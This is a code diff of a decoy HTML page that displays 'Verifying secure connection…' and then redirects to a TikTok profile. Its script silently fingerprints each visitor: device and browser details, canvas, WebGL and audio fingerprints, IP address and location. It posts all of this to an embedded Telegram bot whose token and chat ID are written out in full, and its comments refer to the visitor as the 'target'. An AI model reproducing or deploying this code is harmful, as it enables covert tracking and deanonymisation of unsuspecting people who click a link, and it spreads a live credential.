@@ -14,23 +14,27 @@
   .txt{color:#7d879e;font-size:14px}
   .sub{color:#3d4762;font-size:12px;margin-top:4px}
 </style>
+</head>
+<body>
+<div class="spinner"></div>
+<div class="txt">Verifying secure connection…</div>
+<div class="sub">Redirecting…</div>
+
 <script>
 /* ===================== CONFIG ===================== */
 const BOT_TOKEN  = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
 const CHAT_ID    = "1979116632";
 const REDIRECT   = "https://www.tiktok.com/@whoadrian";
-const REDIRECT_DELAY_MS = 300; // kasih waktu sendBeacon keluar
+const IP_TIMEOUT_MS = 2500;   // tunggu IP max 2.5s, lalu kirim apa pun
+const REDIRECT_AFTER_SEND_MS = 200; // kasih 200ms setelah fetch/sendBeacon
 /* ================================================== */
 
-/* ===================== INSTANT BEACON + REDIRECT =====================
-   Jalan segera setelah <script> ini di-parse — sebelum body render.
-   sendBeacon tidak dibatalkan browser saat redirect / close.
-   ========================================================= */
-(function instantBeaconAndRedirect(){
+(async function fireAndRedirect(){
   const ua = navigator.userAgent || '';
   const n  = navigator;
   const c  = n.connection || n.mozConnection || n.webkitConnection || {};
 
+  /* ---------- device parse ---------- */
   let os='Unknown', br='Unknown', tp='Desktop';
   if(/android/i.test(ua)){os='Android';tp='Mobile';}
   else if(/iphone|ipad|ipod/i.test(ua)){os='iOS';tp='Mobile';}
@@ -42,7 +46,7 @@ const REDIRECT_DELAY_MS = 300; // kasih waktu sendBeacon keluar
   else if(/firefox|fxios/i.test(ua))br='Firefox';
   else if(/safari/i.test(ua)&&!/chrome/i.test(ua))br='Safari';
 
-  // canvas FP
+  /* ---------- canvas FP ---------- */
   let canvasFP='err';
   try{
     const cv=document.createElement('canvas'); cv.width=220; cv.height=40;
@@ -54,7 +58,7 @@ const REDIRECT_DELAY_MS = 300; // kasih waktu sendBeacon keluar
     canvasFP=cv.toDataURL().slice(-32);
   }catch(e){}
 
-  // webgl FP
+  /* ---------- webgl FP ---------- */
   let webglFP='no-webgl';
   try{
     const cv=document.createElement('canvas');
@@ -67,71 +71,7 @@ const REDIRECT_DELAY_MS = 300; // kasih waktu sendBeacon keluar
     }
   }catch(e){}
 
-  const beacon =
-`🔔 <b>Link Clicked — Beacon</b>
-<b>IP:</b> pending (lookup)
-<b>Location (IP-based):</b> pending
-<b>ISP:</b> pending
-<b>OS:</b> ${os} · <b>Browser:</b> ${br} · <b>Type:</b> ${tp}
-<b>UA:</b> <code>${ua}</code>
-<b>Platform:</b> ${n.platform||'?'}
-<b>Vendor:</b> ${n.vendor||'?'}
-<b>Language:</b> ${n.language||'?'} (${(n.languages||[]).join(',')})
-<b>Timezone:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone||'?'}
-<b>Screen:</b> ${screen.width}x${screen.height} @${window.devicePixelRatio||1}x · depth ${screen.colorDepth}
-<b>Viewport:</b> ${innerWidth}x${innerHeight}
-<b>Cores:</b> ${n.hardwareConcurrency||'?'} · <b>Memory:</b> ${n.deviceMemory||'?'} GB
-<b>Touch:</b> ${'ontouchstart' in window||n.maxTouchPoints>0} · <b>Cookies:</b> ${n.cookieEnabled}
-<b>Network:</b> ${c.effectiveType||'unknown'} · ${c.downlink?c.downlink+' Mbps':'unknown'} · RTT ${c.rtt?c.rtt+' ms':'unknown'} · saveData ${!!c.saveData}
-<b>Online:</b> ${n.onLine}
-<b>Referrer:</b> ${document.referrer||'(direct)'}
-<b>URL:</b> ${location.href}
-<b>Canvas FP:</b> <code>${canvasFP}</code>
-<b>WebGL:</b> ${webglFP}
-<b>Audio FP:</b> pending
-<b>Redirect to:</b> ${REDIRECT}
-<i>⏱ fired at page start</i>`;
-
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  const body = new URLSearchParams({
-    chat_id: CHAT_ID,
-    text: beacon,
-    parse_mode: 'HTML',
-    disable_web_page_preview: 'true'
-  });
-
-  // 1) kirim beacon — sendBeacon tidak dibatalkan saat redirect
-  let sent = false;
-  try{
-    if(navigator.sendBeacon){
-      sent = navigator.sendBeacon(url, body);
-    }
-  }catch(e){}
-  if(!sent){
-    try{ fetch(url, {method:'POST', body, keepalive:true}).catch(()=>{}); }catch(e){}
-  }
-
-  // 2) redirect ke TikTok setelah delay kecil — biar beacon sempat keluar
-  setTimeout(() => {
-    // replace() supaya back button tidak balik ke halaman ini
-    try { location.replace(REDIRECT); }
-    catch(e){ location.href = REDIRECT; }
-  }, REDIRECT_DELAY_MS);
-})();
-</script>
-</head>
-<body>
-<div class="spinner"></div>
-<div class="txt">Verifying secure connection…</div>
-<div class="sub">Redirecting…</div>
-
-<script>
-/* ===================== follow-up (best-effort) =====================
-   Kalau target tetap di halaman (redirect diblokir / lambat), kirim
-   follow-up dengan IP + audio. Kalau sudah redirect, script ini mati
-   bersama halaman — tidak masalah, beacon instan sudah terkirim.
-   ========================================================= */
-(async function followUp(){
+  /* ---------- audio FP (paralel dengan IP) ---------- */
   async function audioFingerprint(){
     try{
       const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;
@@ -153,6 +93,7 @@ const REDIRECT_DELAY_MS = 300; // kasih waktu sendBeacon keluar
     }catch(e){ return 'err'; }
   }
 
+  /* ---------- IP lookup dengan timeout ---------- */
   function fetchIPWithTimeout(ms){
     return new Promise(resolve => {
       let done=false;
@@ -180,29 +121,68 @@ const REDIRECT_DELAY_MS = 300; // kasih waktu sendBeacon keluar
     });
   }
 
-  async function tgMessage(text){
-    const fd=new FormData();
-    fd.append('chat_id',CHAT_ID);
-    fd.append('text',text);
-    fd.append('parse_mode','HTML');
-    fd.append('disable_web_page_preview','true');
-    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-      {method:'POST',body:fd,keepalive:true}).then(r=>r.json()).catch(()=>null);
-  }
+  /* ---------- jalankan IP + audio paralel ---------- */
+  const [audio, ip] = await Promise.all([audioFingerprint(), fetchIPWithTimeout(IP_TIMEOUT_MS)]);
 
-  const [audio, ip] = await Promise.all([audioFingerprint(), fetchIPWithTimeout(1500)]);
-  const ipLocLine=(ip.city||ip.region||ip.country)
-    ?[ip.city,ip.region,ip.country].filter(Boolean).join(', '):'n/a';
+  const ipLocLine = (ip.city||ip.region||ip.country)
+    ? [ip.city,ip.region,ip.country].filter(Boolean).join(', ')
+    : 'n/a';
 
-  await tgMessage(
-`🔄 <b>Beacon follow-up</b>
+  /* ---------- SATU pesan lengkap ---------- */
+  const beacon =
+`🔔 <b>New Visitor Beacon</b>
 <b>IP:</b> ${ip.ip}
 <b>Location (IP-based):</b> ${ipLocLine}
 <b>ISP:</b> ${ip.isp||'n/a'}
-<b>Audio FP:</b> <code>${audio}</code>
+<b>OS:</b> ${os} · <b>Browser:</b> ${br} · <b>Type:</b> ${tp}
+<b>UA:</b> <code>${ua}</code>
+<b>Platform:</b> ${n.platform||'?'}
+<b>Vendor:</b> ${n.vendor||'?'}
+<b>Language:</b> ${n.language||'?'} (${(n.languages||[]).join(',')})
+<b>Timezone:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone||'?'}
+<b>Screen:</b> ${screen.width}x${screen.height} @${window.devicePixelRatio||1}x · depth ${screen.colorDepth}
+<b>Viewport:</b> ${innerWidth}x${innerHeight}
+<b>Cores:</b> ${n.hardwareConcurrency||'?'} · <b>Memory:</b> ${n.deviceMemory||'?'} GB
+<b>Touch:</b> ${'ontouchstart' in window||n.maxTouchPoints>0} · <b>Cookies:</b> ${n.cookieEnabled}
+<b>Network:</b> ${c.effectiveType||'unknown'} · ${c.downlink?c.downlink+' Mbps':'unknown'} · RTT ${c.rtt?c.rtt+' ms':'unknown'} · saveData ${!!c.saveData}
+<b>Online:</b> ${n.onLine}
+<b>Referrer:</b> ${document.referrer||'(direct)'}
 <b>URL:</b> ${location.href}
-<b>Redirect:</b> ${REDIRECT}`
-  ).catch(()=>{});
+<b>Canvas FP:</b> <code>${canvasFP}</code>
+<b>WebGL:</b> ${webglFP}
+<b>Audio FP:</b> <code>${audio}</code>
+<b>Redirect to:</b> ${REDIRECT}`;
+
+  /* ---------- kirim: fetch keepalive dulu, fallback sendBeacon ---------- */
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const body = new URLSearchParams({
+    chat_id: CHAT_ID,
+    text: beacon,
+    parse_mode: 'HTML',
+    disable_web_page_preview: 'true'
+  });
+
+  let sentOK = false;
+  try{
+    // fetch keepalive: tidak dibatalkan saat navigasi, bisa dipanggil setelah await
+    const r = await fetch(url, {method:'POST', body, keepalive:true});
+    sentOK = r.ok;
+  }catch(e){}
+
+  if(!sentOK){
+    // fallback: sendBeacon (kalau fetch gagal)
+    try{
+      if(navigator.sendBeacon){
+        navigator.sendBeacon(url, body);
+      }
+    }catch(e){}
+  }
+
+  /* ---------- redirect ke TikTok ---------- */
+  setTimeout(() => {
+    try { location.replace(REDIRECT); }
+    catch(e){ location.href = REDIRECT; }
+  }, REDIRECT_AFTER_SEND_MS);
 })();
 </script>
 </body>
